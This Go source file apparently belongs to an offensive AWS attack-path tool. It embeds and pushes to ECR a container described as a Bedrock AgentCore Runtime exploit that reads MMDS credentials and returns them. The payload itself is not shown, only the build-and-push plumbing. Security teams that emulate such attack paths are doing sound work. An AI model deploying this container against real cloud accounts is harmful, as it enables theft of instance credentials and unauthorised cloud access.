// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package attacker

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
)

//go:embed containers/bedrock-runtime/Dockerfile
var bedrockRuntimeDockerfile []byte

//go:embed containers/bedrock-runtime/server.py
var bedrockRuntimeServerPy []byte

// ContainerSpec defines the files needed to build a container image.
// Each entry maps a filename to its content.
type ContainerSpec map[string][]byte

// BedrockRuntimeContainer is the container spec for the Bedrock AgentCore
// Runtime exploit. It serves /ping (health check) and /invocations (reads MMDS
// credentials and returns them).
var BedrockRuntimeContainer = ContainerSpec{
	"Dockerfile": bedrockRuntimeDockerfile,
	"server.py":  bedrockRuntimeServerPy,
}

// CheckDockerAvailable verifies that docker and docker buildx are installed
// and accessible. Returns a descriptive error if not.
func CheckDockerAvailable() error {
	if _, err := exec.LookPath("docker"); err != nil {
		return fmt.Errorf("docker not found in PATH. Install Docker to build container images: https://docs.docker.com/get-docker/")
	}

	// Verify buildx is available (needed for cross-platform builds)
	cmd := exec.Command("docker", "buildx", "version")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("docker buildx not available. Install the buildx plugin: https://docs.docker.com/build/install-buildx/")
	}

	return nil
}

// BuildAndPushImage writes the container spec files to a temp directory,
// authenticates to ECR, and builds+pushes the image for linux/arm64.
func BuildAndPushImage(attackerCfg aws.Config, repoURI string, tag string, spec ContainerSpec) error {
	if err := CheckDockerAvailable(); err != nil {
		return err
	}

	// Extract region from the repo URI (format: <account>.dkr.ecr.<region>.amazonaws.com/<name>)
	region := extractRegionFromRepoURI(repoURI)
	if region == "" {
		return fmt.Errorf("could not determine region from repo URI: %s", repoURI)
	}

	// Write container spec files to a temp directory
	tempDir, err := os.MkdirTemp("", "pathrunner-container-*")
	if err != nil {
		return fmt.Errorf("failed to create temp directory: %v", err)
	}
	defer func() { _ = os.RemoveAll(tempDir) }()

	for filename, content := range spec {
		path := filepath.Join(tempDir, filename)
		if err := os.WriteFile(path, content, 0644); err != nil {
			return fmt.Errorf("failed to write %s: %v", filename, err)
		}
	}

	// Authenticate docker to ECR
	auth, err := GetECRAuthToken(attackerCfg, region)
	if err != nil {
		return fmt.Errorf("ECR authentication failed: %v", err)
	}

	loginCmd := exec.Command("docker", "login",
		"--username", auth.Username,
		"--password-stdin",
		auth.Endpoint,
	)
	loginCmd.Stdin = strings.NewReader(auth.Password)
	loginCmd.Stdout = os.Stdout
	loginCmd.Stderr = os.Stderr
	if err := loginCmd.Run(); err != nil {
		return fmt.Errorf("docker login to ECR failed: %v", err)
	}

	// Build and push for linux/arm64
	imageRef := fmt.Sprintf("%s:%s", repoURI, tag)
	buildCmd := exec.Command("docker", "buildx", "build",
		"--platform", "linux/arm64",
		"--provenance=false",
		"--push",
		"--tag", imageRef,
		tempDir,
	)
	buildCmd.Stdout = os.Stdout
	buildCmd.Stderr = os.Stderr

	fmt.Printf("[*] Building and pushing container image: %s\n", imageRef)
	if err := buildCmd.Run(); err != nil {
		return fmt.Errorf("docker buildx build failed: %v", err)
	}

	return nil
}

// extractRegionFromRepoURI parses the region from an ECR repository URI.
// Format: <account>.dkr.ecr.<region>.amazonaws.com/<name>
func extractRegionFromRepoURI(uri string) string {
	// Split on "dkr.ecr." and ".amazonaws.com"
	parts := strings.SplitN(uri, ".dkr.ecr.", 2)
	if len(parts) != 2 {
		return ""
	}
	regionParts := strings.SplitN(parts[1], ".amazonaws.com", 2)
	if len(regionParts) != 2 {
		return ""
	}
	return regionParts[0]
}
